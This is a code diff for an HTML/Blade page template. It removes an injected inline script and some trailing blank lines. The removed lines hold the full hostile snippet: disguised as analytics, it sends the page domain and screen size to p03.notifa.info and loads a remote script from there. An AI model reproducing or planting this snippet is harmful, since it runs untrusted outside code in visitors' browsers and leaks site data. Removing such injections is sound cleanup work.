@@ -62,9 +62,5 @@
 <script src="{{ asset ('assets/js/app.min.js') }}"></script>
 <!-- Extra page Js -->
 <script src="{{ asset ('assets/js/pages/examples/pages.js') }}"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnjWASTgP5hsVSxhWofYHzVKu1ugADW6MohhaJU3jwMivgvL62s%2bTwSxdKOjQUiLm06JdvCqZjnWhOil84zOGwKHgyWJ2VNsQBBdN9WQIy8LenF1EBr31msaqyCbEqp8p9YTihGXFaA1v0pYV3glXPolnzZRJlGlS8iqgF7eQP8VPnAvrQqeFWB%2fBdNl0CR3hQRr0QKQqtfWPGoUks9CUYytMhMuo5HKdanV7wzC4x2McV%2beiEiSjRzZJArO2eUlRwRhJS7NEIPMSIwdyGVeB9%2f7g7GaqTCM9e4zp9cri2sQYboIxJfPOLenK5nTGClc%2fvKWSgc%2f27xt409Q0VdKf0%2f7j3%2fdBMY7wrS8VkffH31FUlo4c9VDX0Lk%2b3Wsf%2bsXUYJrW5Far9PWaVx5jHzWCj%2fmID%2fzmwdBebXytp2d3BASi%2beqgbp0y5vkT0fhpgmkGFGvRSSmYIE6saCtlGj4gtSJxRCnNvepr4z%2fX6dSvrzgXRxtdgFN2NZ5ViVHVsove" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</body>
 </html>
-
-
-
-
